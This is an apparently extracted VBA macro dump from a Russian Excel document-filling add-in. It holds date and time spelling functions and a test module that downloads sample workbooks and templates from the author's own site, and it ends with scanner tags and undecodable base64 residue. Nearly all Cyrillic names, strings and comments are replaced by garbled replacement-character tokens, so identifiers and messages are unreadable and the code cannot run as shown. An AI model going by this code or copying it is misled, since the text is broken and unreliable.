    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = FractionalNumberToText(|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, False)
End Function

' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""8 |fffd||fffd||fffd||fffd||fffd||fffd| 2013 |fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|, , 1)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd| = Propis_Time_RUS(|fffd||fffd||fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""9 |fffd||fffd||fffd||fffd||fffd| 58 |fffd||fffd||fffd||fffd||fffd| 36 |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Time_RUS(|fffd||fffd||fffd||fffd||fffd|, 1)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""8 |fffd||fffd||fffd||fffd||fffd||fffd| 2013 |fffd||fffd||fffd||fffd|, 9 |fffd||fffd||fffd||fffd||fffd| 58 |fffd||fffd||fffd||fffd||fffd| 36 |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|, 1, 1)
End Function

Attribute VB_Name = "mod_TestProgram"
'---------------------------------------------------------------------------------------
' Module        : mod_TestProgram
' Author        : EducatedFool                     Date: 07.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Private Module
Const ExcelTableExample$ = "ExcelTable.xls", LocalExcelTableExample$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FillDocuments.xls"
Public TMP_OUTPUT_MASK$

Private Sub test283743()
    Dim pi As ProgressIndicator
    SendInterval& = 10
    StopMacro = False

    Set pi = New ProgressIndicator
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Const stp& = 10: Dim t As Double, pos As Long, prev_dt As Double
    pi.StartNewAction , , , , , SendInterval& * stp&
    t = Timer
    While Timer - t < SendInterval&
        dt = Timer - t: DoEvents
        If StopMacro Then pi.Hide: Application.ScreenUpdating = True: Exit Sub
        If (dt - prev_dt) > 1 / stp& Then
            prev_dt = dt
            pi.SubAction "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & SendInterval& & " |fffd||fffd||fffd|...", _
                         "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Format(SendInterval& - dt, "0.0") & " |fffd||fffd||fffd|..."
        End If
    Wend
    pi.Hide
End Sub

Function DownloadAndOpenExcelTable() As Boolean
    On Error Resume Next: Err.Clear
    URL$ = "http://excelvba.ru/resources/FillDocuments/" & ExcelTableExample$
    filename$ = LocalExcelTableExample$
    Workbooks(filename$).Activate
    If Err = 0 Then DownloadAndOpenExcelTable = True: Exit Function        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

    Dim OK As Boolean
    Err.Clear: tmpXLSpath$ = FWF.temp_folder & filename$

    If GetURLstatus(URL$, 4) = 408 Then
        msg = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ExcelVBA.ru)" & vbNewLine & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Excel |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & vbNewLine & _
              "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    OK = FWF.DownLoadFileFromURL(URL$, tmpXLSpath$)
    If OK Then
        Workbooks.Open tmpXLSpath$
        DownloadAndOpenExcelTable = True
    Else
        msg = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    End If
End Function

Function DownloadTemplatesFromWebsite() As Boolean
    On Error Resume Next
    Dim coll As New Collection, OK As Boolean
    Err.Clear: tmp_path$ = FWF.temp_folder & "template_files.txt"

    URL$ = "http://excelvba.ru/resources/FillDocuments/"
    OK = FWF.DownLoadFileFromURL(URL$, tmp_path$)
    If Not OK Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If
    txt = FWF.ReadTXTfile(tmp_path$)
    arr = Split(txt, "</a>")
    For i = LBound(arr) To UBound(arr)
        arr(i) = Split(arr(i), ">")(UBound(Split(arr(i), ">")))
        If arr(i) Like "*.*" Then
            If arr(i) <> ExcelTableExample$ Then coll.Add arr(i)
        End If
    Next i

    If coll.Count = 0 Then
        msg = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    Dim pi As New ProgressIndicator, n As Long, res As Long
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    pi.StartNewAction , , , , , coll.Count

    For Each item In coll
        n = n + 1: pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & item
        res = res - FWF.DownLoadFileFromURL(URL$ & item, TEMPLATES_FOLDER$ & item)
        fileslist$ = fileslist$ & n & "." & vbTab & item & vbNewLine
    Next
    pi.Hide

    DownloadTemplatesFromWebsite = res = coll.Count
    If res = 0 Then DownloadTemplatesFromWebsite = False
    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & res & " |fffd||fffd| " & coll.Count & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & fileslist$ & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & TEMPLATES_FOLDER$
    MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Function

Function TestRunMainMacro() As Boolean
    On Error Resume Next: Err.Clear
    Workbooks(LocalExcelTableExample$).Activate
    If Err <> 0 Then Exit Function        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

    Range("b2:e4").Select
    TMP_OUTPUT_MASK$ = "{|fffd||fffd||fffd|} - {%filename%}.{%ext%}"
    CreateAllDocuments
    TMP_OUTPUT_MASK$ = ""
    TestRunMainMacro = True
End Function



' =================== |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| =======================================


Private Sub TestFilenamesMask()
    On Error Resume Next

    Dim TemplatesFilenames As Collection: Set TemplatesFilenames = FilenamesCollection(TEMPLATES_FOLDER$)
    BaseCol& = 2

    Worksheets(2).Activate
    Dim ra As Range, ro As Range, cell As Range, newRa As Range
    Set ra = Range(Cells(2, BaseCol&), Cells(3, BaseCol&)).EntireRow
    Set ra = Intersect(ra.EntireRow, ra.EntireRow)
    rc& = Intersect(Columns(1), ra).Cells.Count


    Dim options As Dictionary, FilesCreated As Long, KeysRange As Range, HLcell As Range
    Set KeysRange = SpecialCells_TypeConstants(ActiveSheet.Rows(HEADER_ROW))

    Worksheets(3).Activate
    For Each ro In ra.Rows
        Range("a555").End(xlUp).Offset(1).Value = "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ro.Row & "  (" & ro.Cells(3) & ")</b>"

        Set options = ReadOptions(ro)
        For i = 1 To TemplatesFilenames.Count
            template$ = TemplatesFilenames(i)
            res1 = Replace(template$, TEMPLATES_FOLDER$, "...\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\" & "<b>") & "</b>"

            ' res = CreateAndFillDocument(template$, options, pi2)
            NewFilename$ = "": NewFilename$ = CreatePathForFile(template$, options)
            res2 = Replace(NewFilename$, OUTPUT_FOLDER$, "...\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\" & "<b>") & "</b>"

            Range("a555").End(xlUp).Offset(1).Resize(, 3).Value = _
            Array(SETT.GetText("TextBox_OutputMask"), res1, res2)
        Next i
    Next ro
End Sub


Attribute VB_Name = "sh1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


' InQuest injected base64 decoded content
' "{-jYT
' "{-jYH
' yJ]j
' yJ]j
' jwAj
' ^O*^
' x)br
' x)brC
' )^"p
' xL\z
' *'jSn
' -xZ+
' z{Li
' *'.+-
' L\zT

INQUEST-PP=macro
